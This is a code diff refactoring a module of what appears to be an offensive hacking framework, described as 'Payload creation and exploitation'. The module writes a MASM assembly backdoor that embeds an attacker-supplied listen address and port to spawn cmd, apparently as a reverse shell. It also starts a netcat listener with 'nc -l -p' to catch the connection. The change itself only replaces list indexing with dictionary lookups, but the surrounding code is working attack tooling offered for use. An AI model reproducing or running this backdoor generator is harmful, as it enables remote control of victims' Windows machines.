@@ -9,19 +9,19 @@ info = {
         "description" : "Payload creation and exploitation"
 }
 
-var.lname = ["payload.asm"]
-var.ltype = ["listen"]
+var.all_var['lname'] = "payload.asm"
+var.all_var['ltype'] = "listen"
 
 options ={
-  "LHOST" : [str(var.lhost[0]),'The listen address'],
-  "LPORT" : [str(var.lport[0]),'The listen port'],
-  "LNAME" : [str(var.lname[0]),'The name of payload'],
-  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
+  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
+  "LPORT" : [str(var.all_var['lport']),'The listen port'],
+  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
+  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
 }
 
 def running():
         try:
-                if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
+                if var.all_var['ltype'].lower() == "create":
                         print ("")
                         print (blue+"[*]"+default+ "Create a backdour")
                         time.sleep(2)
@@ -32,7 +32,7 @@ def running():
                         time.sleep(2)
                         print ("")
                         mark = '"'
-                        f = open(var.lname[0] , 'w')
+                        f = open(var.all_var['lname'] , 'w')
                         payload = '''
 .386
 .model flat, stdcall
@@ -47,8 +47,8 @@ includelib \masm32\lib\masm32.lib
 
 .data
   cmd     db "cmd",06
-  UrIP    db '''+mark+var.lhost[0]+'''",0
-  port    db '''+mark+var.lport[0]+'''",0
+  UrIP    db '''+mark+var.all_var['lhost']+'''",0
+  port    db '''+mark+var.all_var['lport']+'''",0
 .data?
   sinfo   STARTUPINFO<>
   pi      PROCESS_INFORMATION<>
@@ -88,8 +88,8 @@ end start
                         f.write(payload)
                         f.close()
 
-                elif var.ltype[0] == "listen" or var.ltype[0] == "LISTEN":
-                        os.system("nc -l -p "+str(var.lport[0])+" -v")
+                elif var.all_var['ltype'].lower() == "listen":
+                        os.system("nc -l -p "+str(var.all_var['lport'])+" -v")
 
                 else:
                         print (red+"[-]"+default+"Choose LTYPE " )
